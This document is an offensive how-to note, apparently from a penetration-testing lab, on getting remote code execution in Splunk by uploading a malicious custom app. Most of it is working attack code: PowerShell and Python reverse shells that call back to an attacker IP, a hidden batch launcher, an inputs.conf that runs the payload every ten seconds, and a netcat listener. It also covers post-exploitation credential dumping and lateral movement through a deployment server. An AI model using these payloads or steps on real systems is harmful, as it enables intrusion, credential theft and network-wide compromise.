## Attacking Splunk
### Objective

Leverage custom applications and built-in script execution features of Splunk to gain Remote Code Execution (RCE) and escalate to SYSTEM/root.
### Exploitable Feature

- Splunk allows installation of custom applications    
- Apps can include:
    - PowerShell scripts        
    - Python scripts
    - Batch files
    - Bash scripts
### Target OS: Windows
#### Directory Structure for App

```
splunk_shell/
├── bin
│   ├── run.ps1      # Reverse shell PowerShell script
│   ├── run.bat      # Batch file to invoke the PS script
│   └── rev.py       # Optional (for Linux hosts)
└── default
    └── inputs.conf  # Defines execution settings
```
### Reverse Shell – PowerShell One-liner (Windows)

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
  $sendback = (iex $data 2>&1 | Out-String );
  $sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length);
  $stream.Flush()
};
$client.Close()
```

Save this to:

```
splunk_shell/bin/run.ps1
```
### `run.bat` – Launcher Script

```bat
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
```

Save this to:

```
splunk_shell/bin/run.bat
```
### inputs.conf – Script Configuration

```ini
[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```

Save this to:

```
splunk_shell/default/inputs.conf
```

> `interval = 10` → Executes every 10 seconds  
> `disabled = 0` → Enables script immediately after upload
### Create App Archive

```bash
tar -czvf updater.tar.gz splunk_shell/
```
### Deploy the App in Splunk GUI

1. Visit:

```
https://<target_ip>:8000/en-US/manager/search/apps/local
```

2. Click “Install app from file”

3. Upload `updater.tar.gz`
   
4. Reverse shell should trigger instantly
### Start Listener

```bash
sudo nc -lnvp 443
```

Expected Output:

```plaintext
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.50] 53145
whoami
nt authority\system
```
### Target OS: Linux

Replace `.bat` and `.ps1` with:

#### `rev.py` – Python Reverse Shell

```python
import sys,socket,os,pty

ip="10.10.14.15"
port=443
s=socket.socket()
s.connect((ip,port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/bash")
```

Update `inputs.conf` accordingly:

```ini
[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = shell
```
### Post-Exploitation

- Reverse shell is typically NT AUTHORITY\SYSTEM or root
- From here:
    - Dump credentials from registry/memory        
    - Use Mimikatz, LaZagne, etc.
    - Begin Active Directory enumeration
    - Lateral movement via credential reuse
### Pivoting via Deployment Server (Advanced)

If Splunk host is a deployment server:

- You can push malicious apps to Universal Forwarders on other machines

Steps:

1. Place app in:

```
$SPLUNK_HOME/etc/deployment-apps/
```

2. App is automatically replicated to enrolled systems   

3. Forwarders execute the script payload (PowerShell preferred for Windows-only networks)

> Note: Universal Forwarders do not include Python, so use PowerShell payloads on Windows.
### Summary

|Step|Description|
|---|---|
|Build app|Create `splunk_shell/` with scripts and `inputs.conf`|
|Upload app|Through Splunk Web UI on port 8000|
|Listener|Use Netcat to catch shell|
|Access level|Often SYSTEM/root due to default service context|
|Post-exploitation|Credential dumping, domain enumeration, lateral movement|
|Bonus|Lateral via deployment server and forwarders|
# Tags
> #Exploitation #Application-Exploitation #Splunk 